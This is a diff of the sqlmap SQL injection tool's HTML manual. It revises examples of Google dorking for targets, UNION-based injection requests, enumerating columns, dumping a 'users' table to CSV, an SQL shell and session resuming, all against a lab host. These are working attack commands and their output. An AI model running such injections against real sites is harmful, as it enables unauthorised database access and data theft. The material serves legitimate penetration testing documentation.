@@ -842,7 +842,7 @@ first 100 results for the Google dork expression with <CODE>GET</CODE> parameter
 asking you if you want to test and inject on each possible affected URL.</P>
 
 <P>Example of Google dorking with expression <CODE>site:yourdomain.com
-inurl:example.php</CODE>:</P>
+ext:php</CODE>:</P>
 <P>
 <BLOCKQUOTE><CODE>
 <PRE>
@@ -1930,7 +1930,8 @@ GET /sqlmap/mysql/get_int.php?id=1%20UNION%20ALL%20SELECT%20NULL%2C%20CONCAT%28C
 Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
 Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
+image/png,*/*;q=0.5
 User-agent: sqlmap/0.6.3 (http://sqlmap.sourceforge.net)
 Connection: close
 
@@ -2729,16 +2730,14 @@ user.</P>
 <P>It is possible to enumerate the list of columns for a specific database
 table.
 This functionality depends on the <CODE>-T</CODE> to specify the table name
-and optionally on <CODE>-D</CODE> to specify the database name.
-If the database name is not specified, the current database name is used by
-sqlmap.</P>
+and optionally on <CODE>-D</CODE> to specify the database name.</P>
 
 <P>Example on a <B>MySQL 5.0.67</B> target:</P>
 <P>
 <BLOCKQUOTE><CODE>
 <PRE>
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --columns \
-  -T users -v 1
+  -T users -D test -v 1
 
 [...]
 back-end DBMS: MySQL >= 5.0.0
@@ -2810,8 +2809,48 @@ Table: users
 
 <P>Note that on PostgreSQL you have to provide <CODE>public</CODE> or the
 name of a system database because it is not possible to enumerate other
-databases tables, only the users' schema that the web application's user
-is connected to, which is always <CODE>public</CODE>.</P>
+databases tables, only the tables under the schema that the web
+application's user is connected to, which is always <CODE>public</CODE>.</P>
+
+<P>If the database name is not specified, the current database name is used.</P>
+
+<P>Example on a <B>MySQL 5.0.67</B> target:</P>
+<P>
+<BLOCKQUOTE><CODE>
+<PRE>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --columns \
+  -T users -v 1
+
+[...]
+back-end DBMS: MySQL >= 5.0.0
+
+[hh:mm:13] [WARNING] missing database parameter, sqlmap is going to use the current 
+database to enumerate table 'users' columns
+[hh:mm:13] [INFO] fetching current database
+[hh:mm:13] [INFO] query: IFNULL(CAST(DATABASE() AS CHAR(10000)), CHAR(32))
+[hh:mm:13] [INFO] retrieved: test
+[hh:mm:13] [INFO] performed 34 queries in 0 seconds
+[hh:mm:13] [INFO] fetching columns for table 'users' on database 'test'
+[hh:mm:13] [INFO] fetching number of columns for table 'users' on database 'test'
+[hh:mm:13] [INFO] query: SELECT IFNULL(CAST(COUNT(column_name) AS CHAR(10000)), CHAR(32)) 
+FROM information_schema.COLUMNS WHERE table_name=CHAR(117,115,101,114,115) AND 
+table_schema=CHAR(116,101,115,116)
+[hh:mm:13] [INFO] retrieved: 3
+[hh:mm:13] [INFO] performed 13 queries in 0 seconds
+[...]
+Database: test
+Table: users
+[3 columns]
++---------+-------------+
+| Column  | Type        |
++---------+-------------+
+| id      | int(11)     |
+| name    | varchar(40) |
+| surname | varchar(60) |
++---------+-------------+
+</PRE>
+</CODE></BLOCKQUOTE>
+</P>
 
 
 <H3>Dump database table entries</H3>
@@ -2822,8 +2861,7 @@ is connected to, which is always <CODE>public</CODE>.</P>
 <P>It is possible to dump the entries for a specific database table.
 This functionality depends on the <CODE>-T</CODE> to specify the table name
 and optionally on <CODE>-D</CODE> to specify the database name.
-If the database name is not specified, the current database name is used by
-sqlmap.</P>
+If the database name is not specified, the current database name is used.</P>
 
 <P>Example on a <B>MySQL 5.0.67</B> target:</P>
 <P>
@@ -2832,15 +2870,22 @@ sqlmap.</P>
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --dump \
   -T users -v 1
 
+[...]
 back-end DBMS: MySQL >= 5.0.0
 
-[15:59:13] [WARNING] missing database parameter, sqlmap is going to use the current database to dump table 'users' entries
-[15:59:13] [INFO] fetching current database
-[15:59:13] [INFO] query: IFNULL(CAST(DATABASE() AS CHAR(10000)), CHAR(32))
-[15:59:13] [INFO] retrieved: test
-[15:59:13] [INFO] performed 34 queries in 0 seconds
-[15:59:13] [INFO] fetching columns for table 'users' on database 'test'
-[15:59:13] [INFO] fetching number of columns for table 'users' on database 'test'
+[hh:mm:13] [WARNING] missing database parameter, sqlmap is going to use the current 
+database to dump table 'users' entries
+[hh:mm:13] [INFO] fetching current database
+[hh:mm:13] [INFO] query: IFNULL(CAST(DATABASE() AS CHAR(10000)), CHAR(32))
+[hh:mm:13] [INFO] retrieved: test
+[hh:mm:13] [INFO] performed 34 queries in 0 seconds
+[hh:mm:13] [INFO] fetching columns for table 'users' on database 'test'
+[hh:mm:13] [INFO] fetching number of columns for table 'users' on database 'test'
+[hh:mm:13] [INFO] query: SELECT IFNULL(CAST(COUNT(column_name) AS CHAR(10000)), CHAR(32)) 
+FROM information_schema.COLUMNS WHERE table_name=CHAR(117,115,101,114,115) AND 
+table_schema=CHAR(116,101,115,116)
+[hh:mm:13] [INFO] retrieved: 3
+[hh:mm:13] [INFO] performed 13 queries in 0 seconds
 [...]
 Database: test
 Table: users
@@ -2911,8 +2956,7 @@ Table: users
 
 [hh:mm:59] [INFO] Table 'public.users' dumped to CSV file '/software/sqlmap/output/
 192.168.1.121/dump/public/users.csv'
-[hh:mm:59] [INFO] Fetched data logged to text files under '/software/sqlmap/output/
-192.168.1.121'
+[...]
 
 $ cat /software/sqlmap/output/192.168.1.121/dump/public/users.csv 
 "id","name","surname"
@@ -3280,8 +3324,8 @@ SELECT 'foo':    'foo'
 
 sql> [UP arrow key shows the just run SQL SELECT statement, DOWN arrow key cleans the shell]
 sql> SELECT version()
-SELECT version():    'PostgreSQL 8.3.5 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 
-(Ubuntu 4.2.3-2ubuntu4)'
+SELECT version():    'PostgreSQL 8.3.5 on i486-pc-linux-gnu, compiled by GCC gcc-4.3.real 
+(Ubuntu 4.3.2-1ubuntu11) 4.3.2'
 
 sql> exit
 
@@ -3704,11 +3748,9 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b \
 
 [...]
 back-end DBMS:  PostgreSQL
-
-[hh:mm:42] [INFO] fetching banner
-[hh:mm:42] [INFO] query: COALESCE(CAST(VERSION() AS CHARACTER(10000)), (CHR(32)))
-[hh:mm:42] [INFO] retrieved: PostgreSQL 8.3.5 o
-[hh:mm:43] [ERROR] user aborted
+[hh:mm:02] [INFO] query: VERSION()
+[hh:mm:02] [INFO] retrieved: PostgreSQL 8.3.5 on i486-pc-^C
+[hh:mm:03] [ERROR] user aborted
 </PRE>
 </CODE></BLOCKQUOTE>
 </P>
@@ -3721,17 +3763,18 @@ retrieving the PostgreSQL banner and logged the session to text file
 <PRE>
 $ cat sqlmap.log
 
-[hh:mm:40 MM/DD/YY]
+[hh:mm:00 MM/DD/YY]
 [http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Injection point][GET]
 [http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Injection parameter][id]
 [http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Injection type][numeric]
 [http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Parenthesis][0]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][CONCAT('1', '1')][]
+[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][CONCAT('9', '9')][]
 [http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][LENGTH(SYSDATE)][]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][COALESCE(9, NULL)][9]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][LENGTH('9')][1]
+[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][COALESCE(3, NULL)][3]
+[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][LENGTH('3')][1]
 [http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][DBMS][PostgreSQL]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][VERSION()][PostgreSQL 8.3.5 o
+[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][VERSION()][PostgreSQL 8.3.5 
+on i486-pc-
 </PRE>
 </CODE></BLOCKQUOTE>
 </P>
@@ -3749,9 +3792,10 @@ the session file in real time while performing the injection.</P>
 </CODE></BLOCKQUOTE>
 </P>
 
-<P>Performing the same request now, sqlmap calculates the query length,
-in the example <CODE>VERSION()</CODE>, and resumes the injection from the last
-character retrieved to the end of the query output.</P>
+<P>Performing the same request now, sqlmap resumes all information already
+retrieved then calculates the query length, in the example
+<CODE>VERSION()</CODE>, and resumes the injection from the last character
+retrieved to the end of the query output.</P>
 <P>
 <BLOCKQUOTE><CODE>
 <PRE>
@@ -3759,17 +3803,27 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b \
   -v 1 -s "sqlmap.log"
 
 [...]
-back-end DBMS:  PostgreSQL
+[hh:mm:03] [INFO] resuming injection point 'GET' from session file
+[hh:mm:03] [INFO] resuming injection parameter 'id' from session file
+[hh:mm:03] [INFO] resuming injection type 'numeric' from session file
+[hh:mm:03] [INFO] resuming 0 number of parenthesis from session file
+[hh:mm:03] [INFO] resuming back-end DBMS 'PostgreSQL' from session file
+[hh:mm:03] [INFO] testing connection to the target url
+[hh:mm:03] [INFO] testing for parenthesis on injectable parameter
+[hh:mm:03] [INFO] retrieving the length of query output
+[hh:mm:03] [INFO] query: LENGTH(VERSION())
+[hh:mm:03] [INFO] retrieved: 98
+[hh:mm:03] [INFO] resumed from file 'sqlmap.log': PostgreSQL 8.3.5 on i486-pc-...
+[hh:mm:03] [INFO] retrieving pending 70 query output characters
+[hh:mm:03] [INFO] query: SUBSTR((VERSION())::text, 29, 98)
+[hh:mm:03] [INFO] retrieved: linux-gnu, compiled by GCC gcc-4.3.real 
+(Ubuntu 4.3.2-1ubuntu11) 4.3.2
+web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
+back-end DBMS: PostgreSQL
 
-[hh:mm:37] [INFO] fetching banner
-[hh:mm:37] [INFO] retrieved the length of query output: 93
-[hh:mm:37] [INFO] resumed from file 'sqlmap.log': PostgreSQL 8.3.5 o...
-[hh:mm:37] [INFO] retrieving pending 75 query output characters
-[hh:mm:37] [INFO] query: COALESCE(CAST(SUBSTR((VERSION()), 19, 93) AS CHARACTER(10000)), 
-(CHR(32)))
-[hh:mm:37] [INFO] starting 1 threads
-[hh:mm:37] [INFO] retrieved: n i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 
-4.2.3-2ubuntu4)
+[hh:mm:07] [INFO] fetching banner
 banner:    'PostgreSQL 8.3.5 on i486-pc-linux-gnu, compiled by GCC gcc-4.3.real 
 (Ubuntu 4.3.2-1ubuntu11) 4.3.2'
 </PRE>
@@ -3791,7 +3845,7 @@ file.</P>
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b \
   -v 1 --save
 
-[hh:mm:33] [INFO] saved command line options on '/software/sqlmap/sqlmap-ADMcR.conf' 
+[hh:mm:33] [INFO] saved command line options on '/software/sqlmap/sqlmap-SAUbs.conf' 
 configuration file
 [hh:mm:33] [INFO] testing connection to the target url
 [hh:mm:33] [INFO] testing if the url is stable, wait a few seconds
@@ -3801,11 +3855,16 @@ configuration file
 </P>
 
 <P>As you can see, sqlmap saved the command line options to a configuration
-INI file, <CODE>sqlmap-ADMcR.conf</CODE>.</P>
+INI file, <CODE>sqlmap-SAUbs.conf</CODE>.</P>
 <P>
 <BLOCKQUOTE><CODE>
 <PRE>
-$ cat sqlmap-ADMcR.conf
+$ cat sqlmap-SAUbs.conf
+
+[Target]
+googleDork = 
+list = 
+url = http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1
 
 [Request]
 aCred = 
@@ -3813,20 +3872,19 @@ aType =
 agent = 
 cookie = 
 data = 
-googleDork = 
+delay = 0
+headers = 
 method = GET
 proxy = 
 referer = 
-testParameter = 
 threads = 1
-url = http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1
+timeout = None
 userAgentsFile = 
 
 [Miscellaneous]
+batch = False
 eta = False
 sessionFile = 
-unionTest = False
-unionUse = False
 updateAll = False
 verbose = 1
 
@@ -3845,6 +3903,8 @@ getPasswordHashes = False
 getPrivileges = False
 getTables = False
 getUsers = False
+limitStart = 0
+limitStop = 0
 query = 
 sqlShell = False
 tbl = 
@@ -3862,27 +3922,34 @@ extensiveFp = False
 
 [Injection]
 dbms = 
+eRegexp = 
+eString = 
+postfix = 
+prefix = 
+regexp = 
 string = 
+testParameter = 
+
+[Techniques]
+timeTest = False
+unionTest = False
+unionUse = False
 </PRE>
 </CODE></BLOCKQUOTE>
 </P>
 
 <P>The file is a valid sqlmap configuration INI file.
 You can edit the configuration options as you wish and pass it to sqlmap
-with the <CODE>-c</CODE> option as explained in the previous paragraph:</P>
+with the <CODE>-c</CODE> option as explained above in section 5.2:</P>
 <P>
 <BLOCKQUOTE><CODE>
 <PRE>
-$ python sqlmap.py -c "sqlmap-ADMcR.conf"
+$ python sqlmap.py -c "sqlmap-SAUbs.conf"
 
 [...]
-back-end DBMS:  PostgreSQL
 
-[hh:mm:10] [INFO] fetching banner
-[hh:mm:10] [INFO] query: COALESCE(CAST(VERSION() AS CHARACTER(10000)), (CHR(32)))
-[hh:mm:10] [INFO] retrieved: PostgreSQL 8.3.5 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 
-4.2.3 (Ubuntu 4.2.3-2ubuntu4)
 [hh:mm:16] [INFO] performed 657 queries in 6 seconds
+
 banner:    'PostgreSQL 8.3.5 on i486-pc-linux-gnu, compiled by GCC gcc-4.3.real 
 (Ubuntu 4.3.2-1ubuntu11) 4.3.2'
 </PRE>
@@ -3902,8 +3969,8 @@ option than letting sqlmap go for a default behaviour.</P>
 <P>
 <BLOCKQUOTE><CODE>
 <PRE>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_str.php?id=1&amp;name=luther" -v 1 \
-  --batch
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_str.php?id=1&amp;name=luther" \
+  --batch -v 1
 
 [hh:mm:22] [INFO] testing if GET parameter 'id' is dynamic
 [hh:mm:22] [INFO] confirming that GET parameter 'id' is dynamic
@@ -3921,7 +3988,8 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_str.php?id=1&am
 [hh:mm:22] [INFO] testing single quoted string injection on GET parameter 'name'
 [hh:mm:22] [INFO] confirming single quoted string injection on GET parameter 'name'
 [hh:mm:22] [INFO] GET parameter 'name' is single quoted string injectable with 0 parenthesis
-[hh:mm:22] [INFO] there were multiple injection points, please select the one to use to go ahead:
+[hh:mm:22] [INFO] there were multiple injection points, please select the one to use to go
+ahead:
 [0] place: GET, parameter: id, type: numeric (default)
 [1] place: GET, parameter: name, type: stringsingle
 [q] Quit
